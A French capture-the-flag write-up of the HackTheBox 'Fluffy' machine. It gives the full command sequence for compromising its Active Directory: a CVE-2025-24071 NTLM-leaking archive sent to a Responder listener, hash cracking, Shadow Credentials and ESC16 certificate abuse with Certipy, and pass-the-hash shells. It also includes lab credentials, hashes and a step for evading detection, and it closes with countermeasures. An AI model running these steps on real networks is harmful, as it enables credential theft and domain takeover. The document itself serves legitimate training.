@@ -1,0 +1,483 @@
+---
+title: 'Fluffy'
+date: '2025-07-13'
+tags: ['Active Directory', 'NTLM Relay', 'Shadow Credentials', 'ESC16', 'Kerberoasting', 'BloodHound']
+draft: false
+summary: 'Guide complet de la machine HTB Fluffy, exploitant une vulnérabilité CVE-2025-24071 pour capturer des hachages NTLM, utilisant BloodHound pour l''analyse AD, et exploitant une vulnérabilité ESC16 sur l''Autorité de Certification pour obtenir les privilèges administrateur.'
+---
+
+<div style={{ display: 'flex', justifyContent: 'center', marginBottom: '2rem' }}>
+  <img
+    src="/static/images/fluffy/fluffy_logo.png"
+    alt="fluffy_logo"
+    style={{ width: '500px', maxWidth: '100%' }}
+  />
+</div>
+
+# 🏢 Types de vulnérabilités exploitées
+
+1. **CVE-2025-24071** : Exposition d'informations sensibles via Windows File Explorer permettant la capture de hachages NTLM
+2. **Shadow Credentials** : Exploitation des droits GenericWrite pour injecter des clés d'authentification
+3. **ESC16** : Vulnérabilité sur l'Autorité de Certification (CA) avec extension de sécurité désactivée
+4. **Kerberoasting** : Attaque sur les comptes de service avec SPN
+
+# 🧭 Méthodologie étape par étape
+
+## 🔍 1. Reconnaissance initiale
+
+### Étape 1.1 : Scan des ports avec Nmap
+
+- **Objectif** : Identifier les services accessibles sur la machine cible
+- **Commande exécutée** :
+
+```bash
+$ nmap -sC -sV 10.10.11.69
+```
+
+- **Résultats** :
+  - **53/tcp** : DNS (Simple DNS Plus)
+  - **88/tcp** : Kerberos (Microsoft Windows Kerberos)
+  - **139/tcp** : NetBIOS-SSN
+  - **389/tcp** : LDAP (Active Directory, domaine: fluffy.htb)
+  - **445/tcp** : SMB (Microsoft-ds)
+  - **464/tcp** : kpasswd5
+  - **593/tcp** : RPC over HTTP
+  - **636/tcp** : LDAPS (SSL/LDAP)
+  - **3268/tcp** : LDAP (Global Catalog)
+  - **3269/tcp** : LDAPS (Global Catalog SSL)
+  - **5985/tcp** : WinRM (HTTP API)
+
+### Étape 1.2 : Configuration DNS
+
+- **Ajout dans /etc/hosts** :
+```bash
+echo "10.10.11.69 DC01.fluffy.htb" >> /etc/hosts
+```
+
+## 🔐 2. Énumération Active Directory
+
+### Étape 2.1 : Énumération SMB
+
+- **Liste des partages** :
+```bash
+$ smbclient -L //10.10.11.69
+```
+
+- **Partages découverts** :
+  - `ADMIN$` : Remote Admin
+  - `C$` : Default share
+  - `IPC$` : Remote IPC
+  - `IT` : Partage personnalisé
+  - `NETLOGON` : Logon server share
+  - `SYSVOL` : Logon server share
+
+### Étape 2.2 : Accès au partage IT
+
+- **Connexion avec les credentials fournis** :
+```bash
+$ smbclient //10.10.11.69/IT -U j.fleischman
+Password: J0elTHEM4n1990!
+```
+
+- **Fichiers découverts** :
+  - `Everything-1.4.1.1026.x64.zip`
+  - `KeePass-2.58.zip`
+  - `Upgrade_Notice.pdf`
+
+### Étape 2.3 : Analyse du fichier PDF
+
+- **Téléchargement et analyse** :
+```bash
+$ smbclient //10.10.11.69/IT -U j.fleischman -c "get Upgrade_Notice.pdf"
+```
+
+- **Vulnérabilités identifiées** :
+  - **CVE-2025-24996** : Contrôle externe du nom/path de fichier dans Windows NTLM
+  - **CVE-2025-24071** : Exposition d'informations sensibles via Windows File Explorer
+
+### Étape 2.4 : Énumération LDAP
+
+- **Requête LDAP avec authentification** :
+```bash
+$ ldapsearch -x -H ldap://10.10.11.69 -D "j.fleischman@fluffy.htb" -w J0elTHEM4n1990! -b "DC=fluffy,DC=htb" > ldapsearch.txt
+```
+
+- **Utilisateurs découverts** :
+  - `administrator`
+  - `ca_svc` (Service Account)
+  - `ldap_svc` (Service Account)
+  - `p.agila`
+  - `j.coffey`
+  - `j.fleischman`
+  - `winrm_svc` (Service Account)
+
+- **Groupes importants** :
+  - `Service Accounts` (contient ca_svc, ldap_svc, winrm_svc)
+  - `Service Account Managers` (contient j.coffey, p.agila)
+
+## 🎯 3. Exploitation de CVE-2025-24071
+🔐 CVE-2025-24071 est une vulnérabilité critique de type spoofing dans Windows File Explorer, révélée en mars 2025. Elle permet à un attaquant de voler des hashs NTLM (utilisés pour l’authentification réseau) sans interaction directe de l’utilisateur, simplement en extrayant une archive compressée contenant un fichier .library-ms malveillant.
+
+⚙️ **Mécanisme d’exploitation** : 
+
+Windows Explorer traite automatiquement les fichiers .library-ms pour en extraire des métadonnées.
+
+Si ce fichier contient un chemin SMB malveillant, l’explorateur tente de s’y connecter, déclenchant une requête d’authentification NTLM.
+Cela expose le hash NTLMv2 de l’utilisateur à un serveur contrôlé par l’attaquant.
+
+### Étape 3.1 : Téléchargement de l'exploit
+
+- **Source** : https://github.com/ThemeHackers/CVE-2025-24071/blob/main/exploit.py
+- **Fonctionnalités** :
+  - Génère un fichier `.library-ms` pointant vers un chemin SMB distant
+  - Crée une archive ZIP exploit.zip
+  - Exploite une faille de spoofing pour capturer des hachages NTLM
+
+### Étape 3.2 : Génération de l'exploit
+
+```bash
+$ python3 cve-2025-24071-exploit.py -f test -i 10.10.14.219
+```
+
+- **Résultat** : Création de `exploit.zip` contenant un fichier malveillant
+
+### Étape 3.3 : Upload de l'exploit
+
+```bash
+$ smbclient //10.10.11.69/IT -U "fluffy.htb\j.fleischman" -c "put exploit.zip"
+```
+
+### Étape 3.4 : Configuration de Responder
+
+Lance Responder pour écouter les connexions SMB vers mon IP, permet de capturer le hash NTLMv2
+
+```bash
+$ sudo responder -I tun0
+```
+
+- **Configuration** : Écoute sur l'interface réseau pour capturer les hachages NTLM
+
+### Étape 3.5 : Déclenchement de l'attaque
+
+- **Connexion avec p.agila** :
+```bash
+$ smbclient //10.10.11.69/IT -U "fluffy.htb\p.agila"
+```
+
+- **Hachage capturé** et enregistrés dans /usr/share/responder/logs :
+```
+[SMB] NTLMv2-SSP Client   : 10.10.11.69
+[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
+[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:ef1a96e8c56b07e8:DDB1963F93BEA3AEECA9F4AB2566FA27:...
+```
+
+### Étape 3.6 : Craquage du hachage avec hashcat et la wordlist rockyou.txt
+
+```bash
+$ hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-10.10.11.69.txt /usr/share/wordlists/rockyou.txt
+```
+
+- **Mot de passe trouvé** : `prometheusx-303`
+
+## 🕵️ 4. Analyse avec BloodHound
+
+BloodHound.py est un outil Python pour collecter des données Active Directory (AD) (utilisateurs, groupes, sessions, etc.) et les importer dans BloodHound pour analyser les chemins d’attaque vers des privilèges élevés (par exemple, Administrators)
+
+### Étape 4.1 : Collecte des données AD
+
+```bash
+$ bloodhound-python -u p.agila -p prometheusx-303 -d fluffy.htb -c All -dc dc01.fluffy.htb -ns 10.10.11.69 --dns-tcp
+```
+
+- **Données collectées** :
+  - 10 utilisateurs
+  - 54 groupes
+  - 2 GPOs
+  - 1 OU
+  - 19 conteneurs
+
+BloodHound.py a généré des fichiers JSON :
+```
+$ ls -ltr *.json
+-rw-rw-r-- 1 nnbb nnbb 23318 11 juil. 18:15 20250711181507_users.json
+-rw-rw-r-- 1 nnbb nnbb 82285 11 juil. 18:15 20250711181507_groups.json
+-rw-rw-r-- 1 nnbb nnbb  3946 11 juil. 18:15 20250711181507_gpos.json
+-rw-rw-r-- 1 nnbb nnbb  1896 11 juil. 18:15 20250711181507_ous.json
+-rw-rw-r-- 1 nnbb nnbb 24709 11 juil. 18:15 20250711181507_containers.json
+-rw-rw-r-- 1 nnbb nnbb  3068 11 juil. 18:15 20250711181507_domains.json
+-rw-rw-r-- 1 nnbb nnbb  3606 11 juil. 18:16 20250711181507_computers.json
+```
+
+### Étape 4.2 : Analyse des chemins d'attaque avec Neo4j et BloodHound
+
+#### Lance Neo4j : Utile dans des outils comme BloodHound pour visualiser des structures Active Directory et les relations entre comptes, groupes et permissions
+
+``` bash
+$ sudo neo4j console
+```
+
+#### Accède à http://localhost:7474, connexion avec neo4j:neo4j, et définir un mot de passe
+
+![neo4j](/static/images/fluffy/conn_neo4j.png)
+
+#### Accède à BloodHound sur http://localhost:8080 pour importer les données JSON
+
+![bloodhound](/static/images/fluffy/conn_bloodhound.png)
+
+![upload](/static/images/fluffy/upload_json.png)
+
+#### Chemins d'attaque
+
+- **Découverte** : `p.agila` est membre de `Service Account Managers` qui a `GenericAll` sur `Service Accounts`
+![chemin_1](/static/images/fluffy/chemin_1.png)
+- **Service Accounts** a `GenericWrite` sur `ca_svc`, `ldap_svc` et `winrm_svc`
+![chemin_2](/static/images/fluffy/chemin_2.png)
+- **winrm_svc** est membre de `Remote Management Users`
+![chemin_3](/static/images/fluffy/chemin_3.png)
+
+## 🔑 5. Attaque Shadow Credentials
+
+### Étape 5.1 : Ajout de p.agila au groupe Service Accounts avec BloodyAD
+
+Cela donne à p.agila la possibilité de modifier les attributs de winrm_svc, y compris msDS-KeyCredentialLink, ce qui permet une attaque Shadow Credentials pour obtenir un accès privilégié via une authentification Kerberos forgée
+
+```bash
+$ bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' 'p.agila'
+```
+
+### Étape 5.2 : Shadow Credentials sur winrm_svc
+
+L’attaque Shadow Credentials exploite les droits d’écriture (ici GenericWrite) sur le compte AD winrm_svc pour ajouter une clé publique à l’attribut msDS-KeyCredentialLink. Cette clé permet de générer un certificat, qui est ensuite utilisé pour obtenir un ticket Kerberos (TGT). Le TGT peut être converti en un hachage NTLM, utilisable pour l’authentification (par exemple, via evil-winrm).
+
+Utilisation des outils Faketime et Certipy :
+- **Faketime :**
+    L’attaque Shadow Credentials repose sur Kerberos, qui est sensible aux décalages horaires (erreur KRB_AP_ERR_SKEW). 
+    
+    Faketime permet de synchroniser l’horloge de votre machine avec celle du contrôleur de domaine pour éviter les erreurs de désynchronisation lors de l’authentification ou de la génération de tickets Kerberos.
+    
+    Sans synchronisation précise, les requêtes Kerberos échoueront, rendant l’attaque impossible.
+
+- **Certipy :**
+    Certipy est un outil Python spécialisé pour les attaques AD, y compris Shadow Credentials. 
+    
+    Il simplifie l’ajout d’une clé msDS-KeyCredentialLink à un compte cible (winrm_svc) et génère un certificat pour obtenir un TGT Kerberos. 
+    
+    Contrairement à PyWhisker, Certipy est plus récent, mieux maintenu, et offre des options spécifiques pour les attaques basées sur les certificats.
+    
+    Il permet de manipuler directement les attributs AD via LDAP et de générer des fichiers .pfx pour l’authentification.
+
+```bash
+$ net time -S 10.10.11.69
+Sat Jul 12 22:41:53 2025
+
+$ faketime '2025-07-12 22:41:10' certipy shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'
+```
+
+- **Résultat** : Obtention du hash NT de winrm_svc : `33bd09dcd697600edf6b3a7af4875767`
+
+### Étape 5.3 : Connexion WinRM avec Evil-WinRM
+
+```
+$ evil-winrm -i 10.10.11.69 -u winrm_svc -H '33bd09dcd697600edf6b3a7af4875767'
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                      
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls
+*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../
+*Evil-WinRM* PS C:\Users\winrm_svc> ls
+
+
+    Directory: C:\Users\winrm_svc
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-r---        5/17/2025  11:56 AM                Desktop
+d-r---        5/19/2025   9:15 AM                Documents
+d-r---        9/15/2018  12:19 AM                Downloads
+d-r---        9/15/2018  12:19 AM                Favorites
+d-r---        9/15/2018  12:19 AM                Links
+d-r---        9/15/2018  12:19 AM                Music
+d-r---        9/15/2018  12:19 AM                Pictures
+d-----        9/15/2018  12:19 AM                Saved Games
+d-r---        9/15/2018  12:19 AM                Videos
+
+
+*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls
+
+
+    Directory: C:\Users\winrm_svc\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/12/2025   1:37 PM             34 user.txt
+```
+
+**Récupération du flag utilisateur : **
+
+``` Bash
+*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> Get-Content .\user.txt
+```
+
+## 🏆 6. Élévation de privilèges via ESC16
+
+### Étape 6.1 : Shadow Credentials sur ca_svc
+
+L'utilisateur winrm_svc est membre de Service Account -> Tentative d'une nouvelle attaque shadow credentials contre l'utilisateur ca_svc
+
+```bash
+$ faketime '2025-07-13 04:29:30' certipy shadow auto -u 'winrm_svc@fluffy.htb' -hashes ':33bd09dcd697600edf6b3a7af4875767' -account 'CA_SVC' -dc-ip '10.10.11.69'
+```
+
+- **Hash NT obtenu** : `ca0f4f9e9eb8a092addf53bb03fc98c8`
+
+### Étape 6.2 : Analyse de l'Autorité de Certification
+
+Recherche d’éventuels modèles de certificats vulnérables ou des erreurs de configuration de sécurité
+
+```bash
+$ certipy find -vulnerable -u 'CA_SVC' -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -stdout -dc-ip 10.10.11.69
+```
+
+- **Vulnérabilité découverte** : ESC16 - Extension de sécurité désactivée
+
+**Description :**
+
+ESC16 est une mauvaise configuration où l’Autorité de Certification (CA) est configurée pour désactiver globalement l’extension de sécurité szOID_NTDS_CA_SECURITY_EXT (OID 1.3.6.1.4.1.311.25.2) dans tous les certificats qu’elle émet. 
+
+Cette extension, introduite avec les mises à jour de sécurité de mai 2022 (KB5014754), est essentielle pour le "mappage fort de certificats", permettant aux contrôleurs de domaine (DC) de lier un certificat à un compte utilisateur ou ordinateur via son SID pour l’authentification.
+
+Quand l’OID 1.3.6.1.4.1.311.25.2 est ajouté au registre DisableExtensionList de la CA (sous HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-Name>\PolicyModules\<PolicyModuleName>), tous les certificats émis n’incluent pas cette extension SID. 
+
+Cela équivaut à activer le drapeau CT_FLAG_NO_SECURITY_EXTENSION pour tous les modèles de certificats.
+
+**Impact :**
+
+Si les DCs ne sont pas en mode "Full Enforcement" (StrongCertificateBindingEnforcement != 2), ils utilisent des méthodes de mappage plus faibles (par exemple, basées sur UPN ou DNS dans le SAN du certificat). 
+
+Cette mauvaise configuration peut résulter d’un contournement par les administrateurs pour résoudre des problèmes de compatibilité post-mises à jour de mai 2022.
+
+### Étape 6.3 : Exploitation ESC16
+
+#### Modification de l'UPN (userPrincipalName) de ca_svc pour correspondre à administrator
+
+⚠️ Rôle du UPN dans ESC16 :
+- Dans ESC16, un attaquant peut demander un certificat en injectant un UPN arbitraire dans le champ SAN (Subject Alternative Name) de la requête.
+- Si la CA accepte cette requête sans validation stricte, elle émet un certificat valide pour un autre utilisateur, comme un administrateur.
+- Ce certificat peut ensuite être utilisé pour s’authentifier en tant que cet utilisateur privilégié, permettant une élévation de privilèges.
+
+```bash
+$ certipy account -u 'winrm_svc@fluffy.htb' -hashes ':33bd09dcd697600edf6b3a7af4875767' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+```
+Cette requete a exploité l'autorité de certification (AD CS) mal configurée pour usurper l’identité d’un utilisateur privilégié, ici administrator. Voici ce que chaque paramètre indique :
+
+🧩 Analyse des options :
+
+-u 'winrm_svc@fluffy.htb' -> Compte utilisé pour l’authentification. Il s’agit du compte compromis ou ayant les droits suffisants
+
+-hashes ':33bd09dcd697600edf6b3a7af4875767' -> Authentification via hash NTLM. Pas besoin du mot de passe en clair
+
+-dc-ip 10.10.11.69 -> Adresse IP du contrôleur de domaine. Cible de la requête LDAP/Kerberos
+
+-upn 'administrator' -> ⚠️ Cœur de l’attaque : on demande à Certipy d’associer un UPN d’un autre utilisateur (ici, un administrateur) au compte ca_svc. Cela revient à dire “je veux un certificat qui m’identifie comme administrator”
+
+-user 'ca_svc' -> Utilisateur cible dans Active Directory auquel on va associer le nouvel UPN
+
+update -> Action qui met à jour le UPN de l’utilisateur dans l’AD si les droits le permettent. Cela prépare le terrain pour obtenir un certificat malveillant ultérieurement
+
+🧨 Ce que ça implique :
+
+L’objectif ici est de transformer le compte ca_svc en une porte d’entrée vers administrator en modifiant son UPN. Une fois que ce UPN est mis à jour, Certipy ou un autre outil peut demander un certificat au nom de administrator, mais qui authentifie ca_svc — et Active Directory accepte la supercherie
+
+#### Demande de certificat
+
+```bash
+$ faketime '2025-07-13 16:05:40' certipy req -username ca_svc -hashes ':ca0f4f9e9eb8a092addf53bb03fc98c8' -dc-ip 10.10.11.69 -ca 'fluffy-DC01-CA' -template User -upn administrator -target fluffy.htb
+```
+
+#### Restauration de l'UPN original pour rester furtif
+
+Dans une attaque de type ESC16, rebasculer le compte ca_svc à son UPN d’origine peut aider à brouiller les pistes, surtout si :
+
+• On veux éviter une détection par audit LDAP ou SIEM qui surveille les changements d’attributs sensibles
+
+• On compte laisser l'artefact dans l’AD mais que le compte ca_svc doit continuer à fonctionner normalement dans l’environnement
+
+```bash
+$ certipy account -u 'winrm_svc@fluffy.htb' -hashes ':33bd09dcd697600edf6b3a7af4875767' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+```
+
+### Étape 6.4 : Authentification avec le certificat généré dans le fichier administrator.pfx
+
+```bash
+$ faketime '2025-07-13 16:20:00' certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
+```
+
+- **Hash NT d'administrator obtenu** : `8da83a3fa618b6e3a00e93f676c92a6e`
+
+### Étape 6.5 : Connexion finale pour récupérer le flag root
+
+```bash
+$ evil-winrm -i 10.10.11.69 -u 'administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'
+```
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
+
+    Directory: C:\Users\Administrator\Desktop
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        7/13/2025   4:54 AM             34 root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> Get-Content .\root.txt
+```
+
+# 🎯 Résumé des techniques utilisées
+
+## 🔍 Reconnaissance
+- **Nmap** : Scan de ports et services
+- **SMB** : Énumération des partages
+- **LDAP** : Énumération des utilisateurs et groupes AD
+
+## 🎣 Capture de credentials
+- **CVE-2025-24071** : Exploitation d'une vulnérabilité Windows File Explorer
+- **Responder** : Capture de hachages NTLM
+- **Hashcat** : Craquage des hachages
+
+## 🕵️ Analyse AD
+- **BloodHound** : Visualisation des relations AD
+- **Neo4j** : Base de données pour BloodHound
+
+## 🔑 Élévation de privilèges
+- **Shadow Credentials** : Injection de clés d'authentification
+- **ESC16** : Exploitation de l'Autorité de Certification
+- **Certipy** : Outil spécialisé pour les attaques AD CS
+
+# 🛡️ Contre-mesures recommandées
+
+1. **Mise à jour Windows** : Appliquer les correctifs pour CVE-2025-24071
+2. **Configuration AD CS** : Activer l'extension de sécurité sur l'Autorité de Certification
+3. **Audit des permissions** : Réviser régulièrement les droits d'accès AD
+4. **Monitoring** : Surveiller les modifications d'attributs sensibles (UPN, msDS-KeyCredentialLink)
+5. **Segmentation réseau** : Limiter l'accès aux services sensibles
+6. **Authentification forte** : Implémenter l'authentification multi-facteurs
+
+# 📚 Ressources utiles
+
+- [CVE-2025-24071 Exploit](https://github.com/ThemeHackers/CVE-2025-24071)
+- [Certipy Documentation](https://github.com/ly4k/Certipy)
+- [BloodHound Wiki](https://bloodhound.readthedocs.io/)
+- [ESC16 Vulnerability](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
+- [Shadow Credentials Attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab) 
